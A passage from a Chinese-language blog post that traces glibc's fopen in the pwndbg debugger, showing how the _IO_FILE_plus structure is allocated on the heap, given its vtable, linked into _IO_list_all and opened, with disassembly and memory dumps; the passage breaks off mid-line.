class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass</span><br><span class="line">Dump of assembler code for function _IO_new_fopen:</span><br><span class="line">=&gt; 0x00007ffff7c7f630 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00007ffff7c7f634 &lt;+4&gt;:     push   r13</span><br><span class="line">   0x00007ffff7c7f636 &lt;+6&gt;:     mov    r13,rsi</span><br><span class="line">   0x00007ffff7c7f639 &lt;+9&gt;:     push   r12</span><br><span class="line">   0x00007ffff7c7f63b &lt;+11&gt;:    push   rbp</span><br><span class="line">   0x00007ffff7c7f63c &lt;+12&gt;:    mov    rbp,rdi</span><br><span class="line">   0x00007ffff7c7f63f &lt;+15&gt;:    mov    edi,0x1d8</span><br><span class="line">   0x00007ffff7c7f644 &lt;+20&gt;:    push   rbx</span><br><span class="line">   0x00007ffff7c7f645 &lt;+21&gt;:    sub    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f649 &lt;+25&gt;:    call   0x7ffff7c28380 &lt;malloc@plt&gt;</span><br><span class="line">   0x00007ffff7c7f64e &lt;+30&gt;:    test   rax,rax</span><br><span class="line">   0x00007ffff7c7f651 &lt;+33&gt;:    je     0x7ffff7c7f721 &lt;_IO_new_fopen+241&gt;</span><br><span class="line">   0x00007ffff7c7f657 &lt;+39&gt;:    mov    rbx,rax</span><br><span class="line">   0x00007ffff7c7f65a &lt;+42&gt;:    lea    rax,[rax+0xe0]</span><br><span class="line">   0x00007ffff7c7f661 &lt;+49&gt;:    xor    edx,edx</span><br><span class="line">   0x00007ffff7c7f663 &lt;+51&gt;:    xor    esi,esi</span><br><span class="line">   0x00007ffff7c7f665 &lt;+53&gt;:    mov    QWORD PTR [rbx+0x88],rax</span><br><span class="line">   0x00007ffff7c7f66c &lt;+60&gt;:    lea    rcx,[rbx+0xf0]</span><br><span class="line">   0x00007ffff7c7f673 &lt;+67&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f676 &lt;+70&gt;:    mov    r12,rbx</span><br><span class="line">   0x00007ffff7c7f679 &lt;+73&gt;:    lea    r8,[rip+0x197a40]        # 0x7ffff7e170c0 &lt;_IO_wfile_jumps&gt;</span><br><span class="line">   0x00007ffff7c7f680 &lt;+80&gt;:    call   0x7ffff7c8e650 &lt;_IO_no_init&gt;</span><br><span class="line">   0x00007ffff7c7f685 &lt;+85&gt;:    lea    rax,[rip+0x197f74]        # 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">   0x00007ffff7c7f68c &lt;+92&gt;:    mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f68f &lt;+95&gt;:    mov    QWORD PTR [rbx+0xd8],rax</span><br><span class="line">   0x00007ffff7c7f696 &lt;+102&gt;:   call   0x7ffff7c8be10 &lt;_IO_new_file_init_internal&gt;</span><br><span class="line">   0x00007ffff7c7f69b &lt;+107&gt;:   mov    ecx,0x1</span><br><span class="line">   0x00007ffff7c7f6a0 &lt;+112&gt;:   mov    rdx,r13</span><br><span class="line">   0x00007ffff7c7f6a3 &lt;+115&gt;:   mov    rsi,rbp</span><br><span class="line">   0x00007ffff7c7f6a6 &lt;+118&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f6a9 &lt;+121&gt;:   call   0x7ffff7c8c180 &lt;_IO_new_file_fopen&gt;</span><br><span class="line">   0x00007ffff7c7f6ae &lt;+126&gt;:   test   rax,rax</span><br><span class="line">   0x00007ffff7c7f6b1 &lt;+129&gt;:   je     0x7ffff7c7f700 &lt;_IO_new_fopen+208&gt;</span><br><span class="line">   0x00007ffff7c7f6b3 &lt;+131&gt;:   test   BYTE PTR [rbx+0x74],0x1</span><br><span class="line">   0x00007ffff7c7f6b7 &lt;+135&gt;:   je     0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">   0x00007ffff7c7f6b9 &lt;+137&gt;:   test   BYTE PTR [rbx],0x8</span><br><span class="line">   0x00007ffff7c7f6bc &lt;+140&gt;:   je     0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">   0x00007ffff7c7f6be &lt;+142&gt;:   mov    ecx,DWORD PTR [rbx+0xc0]</span><br><span class="line">   0x00007ffff7c7f6c4 &lt;+148&gt;:   lea    rdx,[rip+0x197875]        # 0x7ffff7e16f40 &lt;_IO_wfile_jumps_maybe_mmap&gt;</span><br><span class="line">   0x00007ffff7c7f6cb &lt;+155&gt;:   lea    rax,[rip+0x197dae]        # 0x7ffff7e17480 &lt;_IO_file_jumps_maybe_mmap&gt;</span><br><span class="line">   0x00007ffff7c7f6d2 &lt;+162&gt;:   test   ecx,ecx</span><br><span class="line">   0x00007ffff7c7f6d4 &lt;+164&gt;:   cmovg  rax,rdx</span><br><span class="line">   0x00007ffff7c7f6d8 &lt;+168&gt;:   mov    QWORD PTR [rbx+0xd8],rax</span><br><span class="line">   0x00007ffff7c7f6df &lt;+175&gt;:   mov    rax,QWORD PTR [rbx+0xa0]</span><br><span class="line">   0x00007ffff7c7f6e6 &lt;+182&gt;:   mov    QWORD PTR [rax+0xe0],rdx</span><br><span class="line">   0x00007ffff7c7f6ed &lt;+189&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f6f1 &lt;+193&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7f6f4 &lt;+196&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7f6f5 &lt;+197&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7f6f6 &lt;+198&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7f6f8 &lt;+200&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7f6fa &lt;+202&gt;:   ret</span><br><span class="line">   0x00007ffff7c7f6fb &lt;+203&gt;:   nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x00007ffff7c7f700 &lt;+208&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f703 &lt;+211&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c7f706 &lt;+214&gt;:   call   0x7ffff7c8d2b0 &lt;__GI__IO_un_link&gt;</span><br><span class="line">   0x00007ffff7c7f70b &lt;+219&gt;:   mov    rdi,rbx</span><br><span class="line">   0x00007ffff7c7f70e &lt;+222&gt;:   call   0x7ffff7c28370 &lt;free@plt&gt;</span><br><span class="line">   0x00007ffff7c7f713 &lt;+227&gt;:   add    rsp,0x8</span><br><span class="line">   0x00007ffff7c7f717 &lt;+231&gt;:   mov    rax,r12</span><br><span class="line">   0x00007ffff7c7f71a &lt;+234&gt;:   pop    rbx</span><br><span class="line">   0x00007ffff7c7f71b &lt;+235&gt;:   pop    rbp</span><br><span class="line">   0x00007ffff7c7f71c &lt;+236&gt;:   pop    r12</span><br><span class="line">   0x00007ffff7c7f71e &lt;+238&gt;:   pop    r13</span><br><span class="line">   0x00007ffff7c7f720 &lt;+240&gt;:   ret</span><br><span class="line">   0x00007ffff7c7f721 &lt;+241&gt;:   xor    r12d,r12d</span><br><span class="line">   0x00007ffff7c7f724 &lt;+244&gt;:   jmp    0x7ffff7c7f6ed &lt;_IO_new_fopen+189&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><p>看到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f649 &lt;fopen64+25&gt;    call   malloc@plt                  &lt;malloc@plt&gt;</span><br></pre></td></tr></table></figure><p>先调用<code>malloc</code>来分配<code>_IO_FILE_plus</code>的内存，这也告诉我们<code>_IO_FILE_plus</code>是分配在堆上的，此时有了一个chunk位于0x555555559290<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x1e0 (with flag bits: 0x1e1)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559470</span><br><span class="line">Size: 0x20b90 (with flag bits: 0x20b91)</span><br></pre></td></tr></table></figure><p>然后到<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00007ffff7c7f680 &lt;+80&gt;:    call   0x7ffff7c8e650 &lt;_IO_no_init&gt;</span><br></pre></td></tr></table></figure><p>调用<code>_IO_no_init</code>函数，其又调用<code>_IO_old_init</code>函数<br><code>_IO_no_init</code>函数结束后，我们查看这个chunk<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"> pwndbg&gt; x/40gx 0x5555555592a0</span><br><span class="line">0x5555555592a0: 0x00000000fbad0000      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559320: 0x0000000000000000      0x0000555555559380</span><br><span class="line">0x555555559330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559340: 0x0000555555559390      0x0000000000000000</span><br><span class="line">0x555555559350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555559390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555593d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>可以看到完成了部分的初始化，例如<code>_flags</code>字段设置为了0xfbad0000<br>接着继续回到<code>_IO_new_fopen</code>继续初始化<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f68c &lt;fopen64+92&gt;         mov    rdi, rbx                        RDI =&gt; 0x5555555592a0 ◂— 0xfbad0000</span><br><span class="line">  0x7ffff7c7f68f &lt;fopen64+95&gt;         mov    qword ptr [rbx + 0xd8], rax     [0x555555559378] &lt;= 0x7ffff7e17600 (_IO_file_jumps) ◂— 0</span><br></pre></td></tr></table></figure><p>可以看到设置了<code>vtable</code>指针的值到<code>_IO_file_jumps</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72548352,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = 0,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用<code>_IO_new_file_init_internal</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f696 &lt;fopen64+102&gt;        call   _IO_new_file_init_internal  &lt;_IO_new_file_init_internal&gt;</span><br></pre></td></tr></table></figure><p>先继续设置<code>_IO_FILE_plus</code>部分字段的值<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be14 &lt;_IO_new_file_init_internal+4&gt;     or     dword ptr [rdi], 0x240c                        [0x5555555592a0] &lt;= 0xfbad240c (0xfbad0000 | 0x240c)</span><br><span class="line">  0x7ffff7c8be1a &lt;_IO_new_file_init_internal+10&gt;    push   rbx</span><br><span class="line">  0x7ffff7c8be1b &lt;_IO_new_file_init_internal+11&gt;    mov    rbx, rdi                                       RBX =&gt; 0x5555555592a0 ◂— 0xfbad240c</span><br><span class="line">  0x7ffff7c8be1e &lt;_IO_new_file_init_internal+14&gt;    mov    qword ptr [rdi + 0x90], 0xffffffffffffffff     [0x555555559330] &lt;= 0xfffffffffffffff</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539124,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x0,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到先设置了<code>_flags</code>字段的状态位（低两字节）为0x240c，同时设置<code>_offset</code>字段为-1<br>然后调用<code>_IO_link_in</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be29 &lt;_IO_new_file_init_internal+25&gt;    call   _IO_link_in                 &lt;_IO_link_in&gt;</span><br></pre></td></tr></table></figure><p>我们看此时<code>_IO_list_all</code>还指向<code>_IO_2_1_stderr_</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$3 = (struct _IO_FILE_plus *) 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;</span><br></pre></td></tr></table></figure><p><code>_IO_link_in</code>函数先设置了<code>_flags</code>的状态位为0x248c，如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d2f2 &lt;_IO_link_in+34&gt;    mov    ebp, edx                        EBP =&gt; 0xfbad240c</span><br><span class="line">0x7ffff7c8d2f4 &lt;_IO_link_in+36&gt;    and    ebp, 0x80                       EBP =&gt; 0 (0xfbad240c &amp; 0x80)</span><br></pre></td></tr></table></figure><p>然后又进行一些操作（懒得放了），接着调用了<code>__libc_cleanup_push_defer</code>进行一些清理<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d349 &lt;_IO_link_in+121&gt;    call   __libc_cleanup_push_defer   &lt;__libc_cleanup_push_defer&gt;</span><br></pre></td></tr></table></figure><p>后续又是一些操作，然后调用<code>__libc_cleanup_pop_restore</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8d469 &lt;_IO_link_in+409&gt;    call   __libc_cleanup_pop_restore  &lt;__libc_cleanup_pop_restore&gt;</span><br></pre></td></tr></table></figure><p>然后又是一些操作，回到<code>_IO_new_file_init_internal</code>函数，这时我们看创建的<code>_IO_FILE_plus</code>的状态<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$5 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = 0,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现其<code>_chain</code>域指向了<code>_IO_2_1_stderr_</code>，我们再看<code>_IO_list_all</code>指针<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p _IO_list_all</span><br><span class="line">$6 = (struct _IO_FILE_plus *) 0x5555555592a0</span><br></pre></td></tr></table></figure><p>正指向我们创建的<code>_IO_FILE_plus</code>结构体，所以<code>_IO_link_in</code>正是把我们创建的<code>_IO_FILE_plus</code>结构体加入<code>_IO_list_all</code>全局链表中<br>然后<code>_IO_new_file_init_internal</code>将<code>_fileno</code>域设置为-1，接着回到<code>_IO_new_fopen</code><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8be2e &lt;_IO_new_file_init_internal+30&gt;    mov    dword ptr [rbx + 0x70], 0xffffffff             [0x555555559310] &lt;= 0xffffffff</span><br><span class="line">0x7ffff7c8be35 &lt;_IO_new_file_init_internal+37&gt;    pop    rbx                                            RBX =&gt; 0x5555555592a0</span><br><span class="line">0x7ffff7c8be36 &lt;_IO_new_file_init_internal+38&gt;    ret                                &lt;fopen64+107&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *(struct _IO_FILE_plus*) 0x5555555592a0</span><br><span class="line">$7 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72538996,</span><br><span class="line">    _IO_read_ptr = 0x0,</span><br><span class="line">    _IO_read_end = 0x0,</span><br><span class="line">    _IO_read_base = 0x0,</span><br><span class="line">    _IO_write_base = 0x0,</span><br><span class="line">    _IO_write_ptr = 0x0,</span><br><span class="line">    _IO_write_end = 0x0,</span><br><span class="line">    _IO_buf_base = 0x0,</span><br><span class="line">    _IO_buf_end = 0x0,</span><br><span class="line">    _IO_save_base = 0x0,</span><br><span class="line">    _IO_backup_base = 0x0,</span><br><span class="line">    _IO_save_end = 0x0,</span><br><span class="line">    _markers = 0x0,</span><br><span class="line">    _chain = 0x7ffff7e1b6a0 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">    _fileno = -1,</span><br><span class="line">    _flags2 = 0,</span><br><span class="line">    _old_offset = 0,</span><br><span class="line">    _cur_column = 0,</span><br><span class="line">    _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">    _shortbuf = &quot;&quot;,</span><br><span class="line">    _lock = 0x555555559380,</span><br><span class="line">    _offset = -1,</span><br><span class="line">    _codecvt = 0x0,</span><br><span class="line">    _wide_data = 0x555555559390,</span><br><span class="line">    _freeres_list = 0x0,</span><br><span class="line">    _freeres_buf = 0x0,</span><br><span class="line">    __pad5 = 0,</span><br><span class="line">    _mode = 0,</span><br><span class="line">    _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  vtable = 0x7ffff7e17600 &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后调用<code>_IO_file_fopen</code>函数<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c7f6a9 &lt;fopen64+121&gt;                      call   _IO_file_fopen              &lt;_IO_file_fopen&gt;</span><br></pre></td></tr></table></figure><p>其进行一些操作后调用<code>open64</code>函数，真正打开文件<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">► 0x7ffff7c8c0b1 &lt;_IO_file_open+33&gt;    call   open64                      &lt;open64&gt;</span><br><span class="line">        file: 0x555555556007 ◂— &#x27;test.txt&#x27;</span><br><span class="line">        oflag: 0x241</span><br><span class="line">        vararg: 0x1b6</span><br></pre></td></tr></table></figure><p><code>open64</code>返回<code>_IO_file_fopen</code>后，<code>_IO_file_fopen</code>进行一些操作，设置了<code>_fileno</code>域（文件描述符）<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7c8c0b9 &lt;_IO_file_open+41&gt;    test   r12d, r12d     3 &amp; 3     EFLAGS =&gt; 0x206 [ cf PF af zf sf IF df of ac ]</span><br><span class="line">0x7ffff7c8c0bc &lt;_IO_file_open+44&gt;  ✘ js     _IO_file_open+192           &lt;_IO_file_open+192&gt;</span><br><span class="line"></span><br><span class="line">0x7ffff7c8c0c2 &lt;_IO_file_open+50&gt;    mov    eax, dword ptr [rbx]             EAX, [0x5555555592a0] =&gt; 0xfbad248c</span><br><span class="line">0x7ffff7c8c0c4 